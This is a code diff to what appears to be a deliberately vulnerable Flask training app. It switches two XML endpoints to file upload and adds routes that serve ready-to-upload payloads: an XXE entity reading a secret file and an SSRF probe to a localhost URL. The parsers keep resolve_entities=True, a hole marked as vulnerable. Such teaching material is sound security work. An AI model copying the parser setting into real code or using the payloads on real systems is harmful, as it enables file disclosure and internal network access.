@@ -3,7 +3,7 @@ import re
 import subprocess
 import urllib.request
 
-from flask import redirect, render_template, render_template_string, request, session, url_for
+from flask import Response, redirect, render_template, render_template_string, request, session, url_for
 from ldap3 import SUBTREE
 from lxml import etree
 from sqlalchemy import text
@@ -128,7 +128,9 @@ def xml_import():
     result = None
     error = None
     if request.method == "POST":
-        xml_input = request.form.get("xml_input", "")
+        uploaded = request.files.get("xml_file")
+        if uploaded and uploaded.filename:
+            xml_input = uploaded.read().decode("utf-8", errors="replace")
         try:
             # VULNERABLE: resolve_entities=True allows external entities to be expanded
             parser = etree.XMLParser(resolve_entities=True)
@@ -151,13 +153,34 @@ def xml_import():
     )
 
 
+@a03_bp.route("/xml-import/demo-payload.xml")
+def xml_import_demo_payload():
+    # A ready-to-upload copy of the exact payload shown in this example's
+    # Exploitation section -- the secret path is resolved at request time
+    # since it's an absolute filesystem path that varies by environment.
+    payload = (
+        '<?xml version="1.0"?>\n'
+        "<!DOCTYPE contact [\n"
+        f'  <!ENTITY xxe SYSTEM "file://{XXE_SECRET_PATH}">\n'
+        "]>\n"
+        "<contact><name>&xxe;</name></contact>\n"
+    )
+    return Response(
+        payload,
+        mimetype="application/xml",
+        headers={"Content-Disposition": "attachment; filename=xxe-file-disclosure-demo.xml"},
+    )
+
+
 @a03_bp.route("/xxe-ssrf", methods=["GET", "POST"])
 def xxe_ssrf():
     xml_input = ""
     result = None
     error = None
     if request.method == "POST":
-        xml_input = request.form.get("xml_input", "")
+        uploaded = request.files.get("xml_file")
+        if uploaded and uploaded.filename:
+            xml_input = uploaded.read().decode("utf-8", errors="replace")
         try:
             # VULNERABLE: same resolve_entities=True flaw as xml_import(), reused
             # in a different feature -- here the entity target is a URL, not a file.
@@ -179,6 +202,23 @@ def xxe_ssrf():
             error = str(e)
     return render_template(
         "a03_injection/xxe_ssrf.html", xml_input=xml_input, result=result, error=error
+    )
+
+
+@a03_bp.route("/xxe-ssrf/demo-payload.xml")
+def xxe_ssrf_demo_payload():
+    # A ready-to-upload copy of the exact payload shown in this example's
+    # Detect/Exploitation sections -- the target URL is fixed, not
+    # environment-dependent, so this file is identical on every install.
+    payload = (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE status [<!ENTITY probe SYSTEM "http://127.0.0.1:5000/healthz">]>\n'
+        "<status><message>&probe;</message></status>\n"
+    )
+    return Response(
+        payload,
+        mimetype="application/xml",
+        headers={"Content-Disposition": "attachment; filename=xxe-ssrf-demo.xml"},
     )
 
 
